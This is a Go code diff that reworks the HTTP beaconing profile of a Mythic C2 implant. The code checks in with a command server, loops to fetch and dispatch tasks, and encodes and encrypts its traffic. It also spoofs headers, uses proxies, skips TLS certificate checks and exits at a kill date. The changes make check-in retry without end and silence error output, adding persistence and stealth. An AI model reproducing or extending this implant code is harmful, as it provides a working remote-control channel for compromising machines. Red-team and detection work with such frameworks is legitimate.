@@ -159,33 +159,38 @@ func New() structs.Profile {
 
 func (c *C2Default) Start() {
 	// Checkin with Mythic via an egress channel
-	resp := c.CheckIn()
-	checkIn := resp.(structs.CheckInMessageResponse)
-	// If we successfully checkin, get our new ID and start looping
-	if strings.Contains(checkIn.Status, "success") {
-		SetMythicID(checkIn.ID)
-		for {
-			// loop through all task responses
-			message := CreateMythicMessage()
-			encResponse, _ := json.Marshal(message)
-			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
-			resp := c.SendMessage(encResponse).([]byte)
-			if len(resp) > 0 {
-				//fmt.Printf("Raw resp: \n %s\n", string(resp))
-				taskResp := structs.MythicMessageResponse{}
-				err := json.Unmarshal(resp, &taskResp)
-				if err != nil {
-					log.Printf("Error unmarshal response to task response: %s", err.Error())
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
+	for {
+		resp := c.CheckIn()
+		checkIn := resp.(structs.CheckInMessageResponse)
+		// If we successfully checkin, get our new ID and start looping
+		if strings.Contains(checkIn.Status, "success") {
+			SetMythicID(checkIn.ID)
+			for {
+				// loop through all task responses
+				message := CreateMythicMessage()
+				if encResponse, err := json.Marshal(message); err == nil {
+					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
+					resp := c.SendMessage(encResponse).([]byte)
+					if len(resp) > 0 {
+						//fmt.Printf("Raw resp: \n %s\n", string(resp))
+						taskResp := structs.MythicMessageResponse{}
+						if err := json.Unmarshal(resp, &taskResp); err != nil {
+							log.Printf("Error unmarshal response to task response: %s", err.Error())
+							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+							continue
+						}
+						HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+					}
+				} else {
+					//fmt.Printf("Failed to marshal message: %v\n", err)
 				}
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			}
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+		} else {
+			//fmt.Printf("Uh oh, failed to checkin\n")
 		}
-	} else {
-		fmt.Printf("Uh oh, failed to checkin\n")
 	}
+
 }
 
 func (c *C2Default) GetSleepTime() int {
@@ -232,32 +237,34 @@ func (c *C2Default) CheckIn() interface{} {
 	if c.ExchangingKeys {
 		for !c.NegotiateKey() {
 			// loop until we successfully negotiate a key
+			//fmt.Printf("trying to negotiate key\n")
 		}
 	}
 	for {
 		checkin := CreateCheckinMessage()
-		raw, err := json.Marshal(checkin)
-		if err != nil {
+		if raw, err := json.Marshal(checkin); err != nil {
+			time.Sleep(time.Duration(c.GetSleepTime()))
 			continue
-		}
-		resp := c.SendMessage(raw).([]byte)
-
-		// save the Mythic id
-		response := structs.CheckInMessageResponse{}
-		err = json.Unmarshal(resp, &response)
-
-		if err != nil {
-			//log.Printf("Error in unmarshal:\n %s", err.Error())
-			continue
-		}
-
-		if len(response.ID) != 0 {
-			//log.Printf("Saving new UUID: %s\n", response.ID)
-			SetMythicID(response.ID)
 		} else {
-			continue
+			resp := c.SendMessage(raw).([]byte)
+
+			// save the Mythic id
+			response := structs.CheckInMessageResponse{}
+			if err = json.Unmarshal(resp, &response); err != nil {
+				//log.Printf("Error in unmarshal:\n %s", err.Error())
+				time.Sleep(time.Duration(c.GetSleepTime()))
+				continue
+			}
+			if len(response.ID) != 0 {
+				//log.Printf("Saving new UUID: %s\n", response.ID)
+				SetMythicID(response.ID)
+				return response
+			} else {
+				time.Sleep(time.Duration(c.GetSleepTime()))
+				continue
+			}
 		}
-		return response
+
 	}
 
 }
@@ -312,6 +319,17 @@ func (c *C2Default) SendMessage(output []byte) interface{} {
 
 }
 
+var tr = &http.Transport{
+	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	MaxIdleConns:    10,
+	MaxConnsPerHost: 10,
+	//IdleConnTimeout: 1 * time.Nanosecond,
+}
+var client = &http.Client{
+	//Timeout:   1 * time.Second,
+	Transport: tr,
+}
+
 //htmlPostData HTTP POST function
 func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
@@ -327,102 +345,83 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
 
-	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+
+	if len(c.ProxyURL) > 0 {
+		proxyURL, _ := url.Parse(c.ProxyURL)
+		tr.Proxy = http.ProxyURL(proxyURL)
+	} else if !c.ProxyBypass {
+		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
+		tr.Proxy = http.ProxyFromEnvironment
+	}
+
+	contentLength := len(sendDataBase64)
+	//byteBuffer := bytes.NewBuffer(sendDataBase64)
 	for true {
+		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
 		today := time.Now()
 		if today.After(c.Killdate) {
 			os.Exit(1)
-		}
-		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
-		if err != nil {
-			fmt.Printf("Error creating new http request: %s", err.Error())
+		} else if req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64)); err != nil {
+			//fmt.Printf("Error creating new http request: %s", err.Error())
 			continue
-		}
-		contentLength := len(sendData)
-		req.ContentLength = int64(contentLength)
-		for _, val := range c.HeaderList {
-			if val.Key == "Host" {
-				req.Host = val.Value
-			} else {
-				req.Header.Set(val.Key, val.Value)
+		} else {
+			req.ContentLength = int64(contentLength)
+			// set headers
+			for _, val := range c.HeaderList {
+				if val.Key == "Host" {
+					req.Host = val.Value
+				} else {
+					req.Header.Set(val.Key, val.Value)
+				}
 			}
-
-		}
-		// loop here until we can get our data to go through properly
-		//fmt.Printf("about to post data\n")
-		tr := &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		}
-
-		if len(c.ProxyURL) > 0 {
-			proxyURL, _ := url.Parse(c.ProxyURL)
-			tr.Proxy = http.ProxyURL(proxyURL)
-		} else if !c.ProxyBypass {
-			// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
-			tr.Proxy = http.ProxyFromEnvironment
-		}
-
-		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
-			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
-			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
-			req.Header.Add("Proxy-Authorization", basicAuth)
-		}
-
-		client := &http.Client{
-			Timeout:   30 * time.Second,
-			Transport: tr,
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			fmt.Printf("error client.Do: %v\n", err)
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-			continue
-		}
-
-		if resp.StatusCode != 200 {
-			fmt.Printf("error resp.StatusCode: %v\n", err)
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-			continue
-		}
-
-		defer resp.Body.Close()
-
-		body, err := ioutil.ReadAll(resp.Body)
-
-		if err != nil {
-			fmt.Printf("error ioutil.ReadAll: %v\n", err)
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-			continue
-		}
-
-		raw, err := base64.StdEncoding.DecodeString(string(body))
-		if err != nil {
-			fmt.Printf("error base64.StdEncoding: %v\n", err)
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-			continue
-		}
-
-		if len(raw) < 36 {
-			fmt.Printf("error len(raw) < 36: %v\n", err)
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-			continue
-		}
-
-		enc_raw := raw[36:] // Remove the UUID
-		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
-		if len(c.Key) != 0 {
-			//log.Println("just did a post, and decrypting the message back")
-			enc_raw = c.decryptMessage(enc_raw)
-			//log.Println(enc_raw)
-			if len(enc_raw) == 0 {
-				// failed somehow in decryption
-				fmt.Printf("error decrypt length wrong: %v\n", err)
+			if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
+				auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
+				basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
+				req.Header.Add("Proxy-Authorization", basicAuth)
+			}
+			if resp, err := client.Do(req); err != nil {
+				//fmt.Printf("error client.Do: %v\n", err)
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
+			} else if resp.StatusCode != 200 {
+				//fmt.Printf("error resp.StatusCode: %v\n", resp.StatusCode)
+				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				continue
+			} else {
+				defer resp.Body.Close()
+				if body, err := ioutil.ReadAll(resp.Body); err != nil {
+					//fmt.Printf("error ioutil.ReadAll: %v\n", err)
+					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+					continue
+				} else if raw, err := base64.StdEncoding.DecodeString(string(body)); err != nil {
+					//fmt.Printf("error base64.StdEncoding: %v\n", err)
+					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+					continue
+				} else if len(raw) < 36 {
+					//fmt.Printf("error len(raw) < 36: %v\n", err)
+					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+					continue
+				} else if len(c.Key) != 0 {
+					//log.Println("just did a post, and decrypting the message back")
+					enc_raw := c.decryptMessage(raw[36:])
+					if len(enc_raw) == 0 {
+						// failed somehow in decryption
+						//fmt.Printf("error decrypt length wrong: %v\n", err)
+						time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+						continue
+					} else {
+						//fmt.Printf("response: %v\n", enc_raw)
+						return enc_raw
+					}
+				} else {
+					//fmt.Printf("response: %v\n", raw[36:])
+					return raw[36:]
+				}
 			}
 		}
-		//log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
-		return enc_raw
+		//log.Printf("shouldn't be here\n")
+		return make([]byte, 0)
 	}
 	return make([]byte, 0) //shouldn't get here
 }
